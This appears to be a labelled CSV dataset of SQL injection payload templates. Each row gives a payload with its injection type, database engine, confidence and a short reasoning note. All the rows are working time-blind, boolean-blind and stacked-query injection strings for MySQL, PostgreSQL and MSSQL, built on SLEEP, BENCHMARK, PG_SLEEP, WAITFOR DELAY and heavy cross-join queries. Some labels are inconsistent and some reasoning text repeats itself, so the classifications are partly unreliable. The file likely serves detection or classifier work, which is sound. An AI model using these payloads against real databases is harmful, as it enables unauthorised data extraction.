id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
40344,";SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3 ;SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3",stacked_queries,generic,0.75,Stacked queries signal detected: semicolon + new statement,2
40345,";CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ;CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) END",stacked_queries,generic,0.75,Stacked queries signal detected: semicolon + new statement,2
40346,";CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ;CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) END",stacked_queries,generic,0.75,Stacked queries signal detected: semicolon + new statement,2
40347,"AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR]) AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",time_blind,mysql,0.75,Time-blind signal detected: 'sleep(' in mysql payload,4
40348,"OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR]) OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",time_blind,mysql,0.75,Time-blind signal detected: 'sleep(' in mysql payload,4
40349,"AND SLEEP([SLEEPTIME]) AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])",time_blind,mysql,0.75,Time-blind signal detected: 'sleep(' in mysql payload,4
40350,"OR SLEEP([SLEEPTIME]) OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])",time_blind,mysql,0.75,Time-blind signal detected: 'sleep(' in mysql payload,4
40351,"AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')) AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])",time_blind,mysql,0.75,Time-blind signal detected: 'benchmark(' in mysql payload,4
40352,"AND [RANDNUM]=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND [RANDNUM]=IF(([INFERENCE]),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),[RANDNUM])",boolean_blind,mysql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40353,"OR [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')) OR [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])",time_blind,mysql,0.75,Time-blind signal detected: 'benchmark(' in mysql payload,4
40354,"OR [RANDNUM]=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) OR [RANDNUM]=IF(([INFERENCE]),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),[RANDNUM])",boolean_blind,mysql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40355,"RLIKE SLEEP([SLEEPTIME]) RLIKE (SELECT [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]))",time_blind,mysql,0.75,Time-blind signal detected: 'sleep(' in mysql payload,3
40356,"RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR]) RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",time_blind,mysql,0.75,Time-blind signal detected: 'sleep(' in mysql payload,3
40357,"AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME])) AND ELT([INFERENCE],SLEEP([SLEEPTIME]))",time_blind,mysql,0.75,Time-blind signal detected: 'sleep(' in mysql payload,3
40358,"OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME])) OR ELT([INFERENCE],SLEEP([SLEEPTIME]))",time_blind,mysql,0.75,Time-blind signal detected: 'sleep(' in mysql payload,3
40359,AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END),time_blind,postgresql,0.75,Time-blind signal detected: 'sleep(' in postgresql payload,4
40360,OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END),time_blind,postgresql,0.75,Time-blind signal detected: 'sleep(' in postgresql payload,4
40361,"AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40362,"OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40363,WAITFOR DELAY '0:0:[SLEEPTIME]' IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]',time_blind,mssql,0.75,Time-blind signal detected: 'waitfor delay' in mssql payload,4
